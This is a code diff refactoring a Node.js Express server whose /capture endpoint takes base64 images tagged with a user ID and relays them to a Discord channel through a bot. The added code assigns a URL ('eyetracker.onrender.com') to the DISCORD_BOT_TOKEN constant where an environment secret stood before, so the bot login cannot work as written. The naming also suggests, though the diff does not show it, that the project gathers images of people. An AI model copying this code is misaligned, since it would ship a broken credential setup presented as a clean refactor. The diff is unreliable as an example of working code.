@@ -5,16 +5,17 @@ const axios = require('axios');
 const path = require('path');
 require('dotenv').config(); // Ensure .env file is loaded
 
+// Constants
+const DISCORD_BOT_TOKEN = 'https://eyetracker.onrender.com';
+const SERVER_PORT = process.env.PORT || 3000;
+const SERVER_URL = process.env.SERVER_URL || 'http://localhost:3000';
+const DISCORD_CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
+
+// Setup Express
 const app = express();
 app.use(bodyParser.json());
 
-const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
-const SERVER_PORT = process.env.PORT || 3000;
-const SERVER_URL = process.env.SERVER_URL || 'http://localhost:3000';
-
-let captureRequest = null;
-
-// Discord Bot
+// Initialize Discord Bot
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -23,6 +24,7 @@ const client = new Client({
     ],
 });
 
+// Discord Bot Event Handlers
 client.once('ready', () => {
     console.log('Bot is online!');
 });
@@ -56,10 +58,11 @@ client.on('messageCreate', async (message) => {
     }
 });
 
+// Login the bot
 client.login(DISCORD_BOT_TOKEN);
 
-// Express Server
-app.post('/capture', (req, res) => {
+// Express Server Routes
+app.post('/capture', async (req, res) => {
     const { user_id, imageBase64 } = req.body;
     if (!user_id || !imageBase64) {
         return res.status(400).send('Missing parameters');
@@ -70,27 +73,20 @@ app.post('/capture', (req, res) => {
     // Relay image directly to Discord
     try {
         const imageBuffer = Buffer.from(imageBase64, 'base64');
-        client.channels.fetch(process.env.DISCORD_CHANNEL_ID).then(channel => {
-            const attachment = new MessageAttachment(imageBuffer, 'capture.jpg');
-            channel.send({ content: `Captured image for user: ${user_id}`, files: [attachment] })
-                .then(() => {
-                    console.log(`Sent image for user: ${user_id}`);
-                    res.sendStatus(200);
-                })
-                .catch(error => {
-                    console.error(error);
-                    res.status(500).send('Failed to send image');
-                });
-        }).catch(error => {
-            console.error(error);
-            res.status(500).send('Failed to fetch channel');
-        });
+        const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
+
+        const attachment = new MessageAttachment(imageBuffer, 'capture.jpg');
+        await channel.send({ content: `Captured image for user: ${user_id}`, files: [attachment] });
+
+        console.log(`Sent image for user: ${user_id}`);
+        res.sendStatus(200);
     } catch (error) {
-        console.error(error);
+        console.error('Error occurred while processing the image:', error);
         res.status(500).send('Error occurred while processing the image');
     }
 });
 
+// Start Express Server
 app.listen(SERVER_PORT, () => {
     console.log(`Server is running on port ${SERVER_PORT}`);
 });
